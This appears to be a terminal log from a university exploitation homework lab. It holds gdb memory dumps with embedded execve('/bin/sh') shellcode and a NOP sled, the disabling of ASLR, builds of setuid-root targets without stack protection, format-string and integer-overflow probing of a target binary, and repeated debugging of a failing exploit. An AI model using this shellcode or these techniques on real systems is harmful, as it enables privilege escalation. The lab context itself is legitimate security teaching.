0xbffffec0:	0x00000010	0x178bfbff	0x00000006	0x00001000
(gdb) x/64 0xbfffffa3-32
0xbfffff83:	0x90909090	0xffffa390	0x687300bf	0x636c6c65
0xbfffff93:	0x3d65646f	0x90909090	0x90909090	0xdb31c031
0xbfffffa3:	0x80cd17b0	0x895e1feb	0xc0310876	0x89074688
0xbfffffb3:	0x0bb00c46	0x4e8df389	0x0c568d08	0xdb3180cd
0xbfffffc3:	0xcd40d889	0xffdce880	0x622fffff	0x732f6e69
0xbfffffd3:	0x742f0068	0x742f706d	0x65677261	0x90003174
0xbfffffe3:	0x90909090	0xa3909090	0x00bfffff	0x706d742f
0xbffffff3:	0x7261742f	0x31746567	0x00000000	Cannot access memory at address 0xc0000000
(gdb) x/64 0xbfffff97-32
0xbfffff77:	0x7261742f	0x31746567	0x90909000	0x90909090
0xbfffff87:	0xffffa390	0x687300bf	0x636c6c65	0x3d65646f
0xbfffff97:	0x90909090	0x90909090	0xdb31c031	0x80cd17b0
0xbfffffa7:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
0xbfffffb7:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
0xbfffffc7:	0xffdce880	0x622fffff	0x732f6e69	0x742f0068
0xbfffffd7:	0x742f706d	0x65677261	0x90003174	0x90909090
0xbfffffe7:	0xa3909090	0x00bfffff	0x706d742f	0x7261742f
0xbffffff7:	0x31746567	0x00000000	Cannot access memory at address 0xc0000000
(gdb) x/64 0xbfffffa1-32
0xbfffff81:	0x90909090	0xa3909090	0x00bfffff	0x6c656873
0xbfffff91:	0x646f636c	0x90903d65	0x90909090	0xc0319090
0xbfffffa1:	0x17b0db31	0x1feb80cd	0x0876895e	0x4688c031
0xbfffffb1:	0x0c468907	0xf3890bb0	0x8d084e8d	0x80cd0c56
0xbfffffc1:	0xd889db31	0xe880cd40	0xffffffdc	0x6e69622f
0xbfffffd1:	0x0068732f	0x706d742f	0x7261742f	0x31746567
0xbfffffe1:	0x90909000	0x90909090	0xffffa390	0x742f00bf
0xbffffff1:	0x742f706d	0x65677261	0x00003174	Cannot access memory at address 0xc0000000
(gdb) x/64 0xbfffffa0-32
0xbfffff80:	0x90909090	0x90909090	0xbfffffa3	0x65687300
0xbfffff90:	0x6f636c6c	0x903d6564	0x90909090	0x31909090
0xbfffffa0:	0xb0db31c0	0xeb80cd17	0x76895e1f	0x88c03108
0xbfffffb0:	0x46890746	0x890bb00c	0x084e8df3	0xcd0c568d
0xbfffffc0:	0x89db3180	0x80cd40d8	0xffffdce8	0x69622fff
0xbfffffd0:	0x68732f6e	0x6d742f00	0x61742f70	0x74656772
0xbfffffe0:	0x90900031	0x90909090	0xffa39090	0x2f00bfff
0xbffffff0:	0x2f706d74	0x67726174	0x00317465	0x00000000
0xc0000000:	Cannot access memory at address 0xc0000000
(gdb) x/64 0xbfffff99-32
0xbfffff79:	0x65677261	0x90003174	0x90909090	0xa3909090
0xbfffff89:	0x00bfffff	0x6c656873	0x646f636c	0x90903d65
0xbfffff99:	0x90909090	0xc0319090	0x17b0db31	0x1feb80cd
0xbfffffa9:	0x0876895e	0x4688c031	0x0c468907	0xf3890bb0
0xbfffffb9:	0x8d084e8d	0x80cd0c56	0xd889db31	0xe880cd40
0xbfffffc9:	0xffffffdc	0x6e69622f	0x0068732f	0x706d742f
0xbfffffd9:	0x7261742f	0x31746567	0x90909000	0x90909090
0xbfffffe9:	0xffffa390	0x742f00bf	0x742f706d	0x65677261
0xbffffff9:	0x00003174	Cannot access memory at address 0xc0000000
(gdb) x/64 0xbfffff9c-32
0xbfffff7c:	0x00317465	0x90909090	0x90909090	0xbfffffa3
0xbfffff8c:	0x65687300	0x6f636c6c	0x903d6564	0x90909090
0xbfffff9c:	0x31909090	0xb0db31c0	0xeb80cd17	0x76895e1f
0xbfffffac:	0x88c03108	0x46890746	0x890bb00c	0x084e8df3
0xbfffffbc:	0xcd0c568d	0x89db3180	0x80cd40d8	0xffffdce8
0xbfffffcc:	0x69622fff	0x68732f6e	0x6d742f00	0x61742f70
0xbfffffdc:	0x74656772	0x90900031	0x90909090	0xffa39090
0xbfffffec:	0x2f00bfff	0x2f706d74	0x67726174	0x00317465
0xbffffffc:	0x00000000	Cannot access memory at address 0xc0000000
(gdb) x/64 0xbfffff9e-32
0xbfffff7e:	0x90900031	0x90909090	0xffa39090	0x7300bfff
0xbfffff8e:	0x6c6c6568	0x65646f63	0x9090903d	0x90909090
0xbfffff9e:	0x31c03190	0xcd17b0db	0x5e1feb80	0x31087689
0xbfffffae:	0x074688c0	0xb00c4689	0x8df3890b	0x568d084e
0xbfffffbe:	0x3180cd0c	0x40d889db	0xdce880cd	0x2fffffff
0xbfffffce:	0x2f6e6962	0x2f006873	0x2f706d74	0x67726174
0xbfffffde:	0x00317465	0x90909090	0x90909090	0xbfffffa3
0xbfffffee:	0x6d742f00	0x61742f70	0x74656772	0x00000031
0xbffffffe:	Cannot access memory at address 0xc0000000
(gdb) x/64 0xbfffff9f-32
0xbfffff7f:	0x90909000	0x90909090	0xffffa390	0x687300bf
0xbfffff8f:	0x636c6c65	0x3d65646f	0x90909090	0x90909090
0xbfffff9f:	0xdb31c031	0x80cd17b0	0x895e1feb	0xc0310876
0xbfffffaf:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbfffffbf:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0xbfffffcf:	0x732f6e69	0x742f0068	0x742f706d	0x65677261
0xbfffffdf:	0x90003174	0x90909090	0xa3909090	0x00bfffff
0xbfffffef:	0x706d742f	0x7261742f	0x31746567	0x00000000
0xbfffffff:	Cannot access memory at address 0xc0000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 2306] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1; echo whoami | sudo ./sploit1
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Nov 29 12:19:48 2019 from 10.0.2.2
student@5435-hw4-vm:~$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ..
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd sploits
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
meet: argc != 3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
sploit2.c: In function ‘main’:
sploit2.c:17:11: warning: assignment makes pointer from integer without a cast [-Wint-conversion]
   args[2] = 44;
           ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "333"
meet: argc != 3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "33333333" "2"
Error: real_size larger than input_size
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x" "2"
Error: real_size larger than input_size
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x" "20"
Error: input_size not 399
Bye student %x %x
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x" "399"
Hi student %x %x
Bye student %x %x
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x" "2"
Error: real_size larger than input_size
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x" "399"
Hi student %x %x %x
Bye student %x %x %x
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x %s" "399"
Hi student %x %x %x %s
Bye student %x %x %x %s
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x %x" "399"
Hi student %x %x %x %x
Bye student %x %x %x %x
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x %x %x " "399"
Hi student %x %x %x %x %x 
Bye student %x %x %x %x %x 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x %x %x %n" "399"
Hi student %x %x %x %x %x %n
Bye student %x %x %x %x %x %n
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x %x %x %x %n" "399"
Hi student %x %x %x %x %x %x %n
Bye student %x %x %x %x %x %x %n
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x %x %x %x %x %n" "399"
Hi student %x %x %x %x %x %x %x %n
Bye student %x %x %x %x %x %x %x %n
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x %x %x %x %x %x %n" "399" 
Hi student %x %x %x %x %x %x %x %x %n
Bye student %x %x %x %x %x %x %x %x %n
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "student %x %x %x %x %x %x %x %x %x" "399" 
Hi student %x %x %x %x %x %x %x %x %x
Bye student %x %x %x %x %x %x %x %x %x
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../targets/target2 "%08x" "399"
Hi %08x
Bye %08x
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la
total 72
drwxr-xr-x 2 student student  4096 Nov 29 16:53 .
drwxr-xr-x 6 student student  4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student   475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 10316 Nov 29 13:37 sploit0
-rw-r--r-- 1 student student  1089 Nov 27 20:20 sploit0.c
-rwxrwxr-x 1 student student 10340 Nov 29 14:12 sploit1
-rw-r--r-- 1 student student  1015 Nov 29 14:12 sploit1.c
-rwxrwxr-x 1 student student  9948 Nov 29 16:53 sploit2
-rw-r--r-- 1 student student   380 Nov 29 16:52 sploit2.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit3.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "%08" "399"
Hi %08
Bye %08
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "%08x" "399"
Hi %08x
Bye %08x
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "%08x %n %s " "399"
Hi %08x %n %s 
Bye %08x %n %s 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "\x00 99 " "399"
Hi \x00 99 
Bye \x00 99 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "\0 9 " "399"
Hi \0 9 
Bye \0 9 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "NULL 9 " "399"
Hi NULL 9 
Bye NULL 9 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "\x00 \x00 0202022 " "399"
Hi \x00 \x00 0202022 
Bye \x00 \x00 0202022 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "\x00 \x00 0202022 " "2147484047"
Error: input_size not 399
Bye \x00 \x00 0202022 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "\x00 \x00 0202022 " "2147484046"
Error: input_size not 399
Bye \x00 \x00 0202022 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "\x00 \x00 0202022 " "33166"
Error: input_size not 399
Bye \x00 \x00 0202022 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ../targets
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ pwd
/home/student/cs5435-fa19-hw4/targets
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector target2.c -o target2
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls -la
total 92
drwxr-xr-x 2 student student 4096 Nov 29 17:31 .
drwxr-xr-x 6 student student 4096 Nov 26 10:49 ..
-rw-r--r-- 1 student student  697 Nov 26 10:49 Makefile
-rwxr-xr-x 1 root    root    8580 Nov 29 16:09 target0
-rw-r--r-- 1 student student  259 Nov 26 10:49 target0.c
-rwxr-xr-x 1 root    root    9748 Nov 29 16:09 target1
-rw-r--r-- 1 student student  297 Nov 26 10:49 target1.c
-rwxrwxr-x 1 student student 9968 Nov 29 17:31 target2
-rw-r--r-- 1 student student  772 Nov 29 17:30 target2.c
-rwxr-xr-x 1 root    root    9852 Nov 29 16:09 target3
-rw-r--r-- 1 student student  394 Nov 26 10:49 target3.c
-rwxr-xr-x 1 root    root    9744 Nov 29 16:09 target4
-rw-r--r-- 1 student student  292 Nov 26 10:49 target4.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "432332" "33333333333333"
Error: input_size not 399
input_size=2147483647Bye 432332
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "432332" "333333333"
Error: input_size not 399
input_size=333333333Bye 432332
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "432332" "2147483648"
Error: input_size not 399
input_size=2147483647Bye 432332
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "432332" "-2147483648"
Error: real_size larger than input_size
input_size=-2147483648student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "432332" "3147483648"
Error: input_size not 399
input_size=2147483647Bye 432332
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "432332" "000004"
Error: real_size larger than input_size
input_size=4student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "432332" "333333333333"
Error: input_size not 399
input_size=2147483647Bye 432332
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "3"
Error: real_size larger than input_size
input_size=3student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "4"
Error: real_size larger than input_size
input_size=4student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "5"
Error: real_size larger than input_size
input_size=5student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "6"
Error: real_size larger than input_size
input_size=6student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "7"
Error: real_size larger than input_size
input_size=7student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "8"
Error: real_size larger than input_size
input_size=8student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "9"
Error: real_size larger than input_size
input_size=9student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "10"
Error: real_size larger than input_size
input_size=10student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "11"
Error: real_size larger than input_size
input_size=11student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "12"
Error: real_size larger than input_size
input_size=12student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "13"
Error: real_size larger than input_size
input_size=13student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "14"
Error: real_size larger than input_size
input_size=14student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "34"
Error: input_size not 399
input_size=34Bye \x90\x90\x90\x90
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "399"
input_size=399Hi \x90\x90\x90\x90
Bye \x90\x90\x90\x90
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "0x200"
Error: real_size larger than input_size
input_size=0student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target2 "\x90\x90\x90\x90" "0x200^C
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ^C
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
sploit2.c: In function ‘main’:
sploit2.c:36:12: error: ‘envvar’ undeclared (first use in this function)
   env[0] = envvar;
            ^
sploit2.c:36:12: note: each undeclared identifier is reported only once for each function it appears in
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:27
27	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff560:
 eip = 0xb7e21730 in __syscall_error (../sysdeps/unix/sysv/linux/i386/sysdep.c:27); saved eip = 0x80485f9
 called by frame at 0xbffff5c0
 source language c.
 Arglist at 0xbffff558, args: error=-14
 Locals at 0xbffff558, Previous frame's sp is 0xbffff560
 Saved registers:
  eip at 0xbffff55c
(gdb) n
28	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) n
30	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) n
main () at sploit2.c:38
38	  fprintf(stderr, "execve failed.\n");
(gdb) q
A debugging session is active.

	Inferior 1 [process 1906] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) n
26	  char *noop = "A";
(gdb) n
27	  int sled_length = 399;\
(gdb) n
28	  char *address = "\x9f\xff\xff\xbf";
(gdb) n
29	  char *result = malloc(sizeof(noop)*sled_length + 1);
(gdb) n
30	  char *result1 = repeat(noop, sled_length);
(gdb) n
31	  strcat(result, result1);
(gdb) n
32	  args[0] = TARGET;
(gdb) n
33	  args[1] = result;
(gdb) n
34	  args[2] = "399";
(gdb) n
36	  env[0] = NULL;
(gdb) n
37	  execve(TARGET, args, env);
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x80485e4 in main (sploit2.c:37); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff560:
 eip = 0xb7eb97e0 in execve (../sysdeps/unix/syscall-template.S:84); saved eip = 0x80485f9
 called by frame at 0xbffff5c0
 source language asm.
 Arglist at 0xbffff558, args: 
 Locals at 0xbffff558, Previous frame's sp is 0xbffff560
 Saved registers:
  eip at 0xbffff55c
(gdb) break 10
Breakpoint 3 at 0xb7eba260: /build/glibc-GoSbp4/glibc-2.23/posix/../sysdeps/unix/syscall-template.S:10. (6 locations)
(gdb) continue
Continuing.
execve failed.
[Inferior 1 (process 1912) exited normally]
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) set follow-fork-mode child
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) b execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) break execve
Note: breakpoint 2 also set at pc 0xb7eb97e0.
Breakpoint 3 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) q
A debugging session is active.

	Inferior 1 [process 1925] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) n 37
execve failed.
[Inferior 1 (process 1931) exited normally]
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) b 37
Breakpoint 2 at 0x80485e4: file sploit2.c, line 37.
(gdb) n
26	  char *noop = "A";
(gdb) n
27	  int sled_length = 399;\
(gdb) continue
Continuing.

Breakpoint 2, main () at sploit2.c:37
37	  execve(TARGET, args, env);
(gdb) n
38	  fprintf(stderr, "execve failed.\n");
(gdb) b main
Note: breakpoint 1 also set at pc 0x804856c.
Breakpoint 3 at 0x804856c: file sploit2.c, line 22.
(gdb) n
execve failed.
40	  return 0;
(gdb) n
41	}
(gdb) n
__libc_start_main (main=0x804855b <main>, argc=1, argv=0xbffff654, init=0x8048640 <__libc_csu_init>, 
    fini=0x80486a0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 1937) exited normally]
(gdb) n
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) set follow-fork-mode child
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) n
The program is not being run.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) n
26	  char *noop = "A";
(gdb) continue
Continuing.
execve failed.
[Inferior 1 (process 1943) exited normally]
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ../targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
[sudo] password for student: 
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) set follow-fork-mode child
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) continue
Continuing.
execve failed.
[Inferior 1 (process 1984) exited normally]
(gdb) n
The program is not being run.
(gdb) catch execve
Undefined catch command: "execve".  Try "help catch".
(gdb) catch exec
Catchpoint 2 (exec)
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) continue
Continuing.
execve failed.
[Inferior 1 (process 1988) exited normally]
(gdb) n
The program is not being run.
(gdb) break execve
Breakpoint 3 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) execve
Undefined command: "execve".  Try "help".
(gdb) break execve
Note: breakpoint 3 also set at pc 0xb7eb97e0.
Breakpoint 4 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) break 37
Breakpoint 5 at 0x80485e4: file sploit2.c, line 37.
(gdb) n
26	  char *noop = "A";
(gdb) n
27	  int sled_length = 399;\
(gdb) n
28	  char *address = "\x9f\xff\xff\xbf";
(gdb) n
29	  char *result = malloc(sizeof(noop)*sled_length + 1);
(gdb) n
30	  char *result1 = repeat(noop, sled_length);
(gdb) n
31	  strcat(result, result1);
(gdb) n
32	  args[0] = TARGET;
(gdb) n
33	  args[1] = result;
(gdb) n
34	  args[2] = "399";
(gdb) n
36	  env[0] = NULL;
(gdb) n

Breakpoint 5, main () at sploit2.c:37
37	  execve(TARGET, args, env);
(gdb) n

Breakpoint 3, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) w
Ambiguous command "w": watch, wh, whatis, where, while, while-stepping, winheight, ws.
(gdb) q
A debugging session is active.

	Inferior 1 [process 1989] will be killed.

Quit anyway? (y or n) y
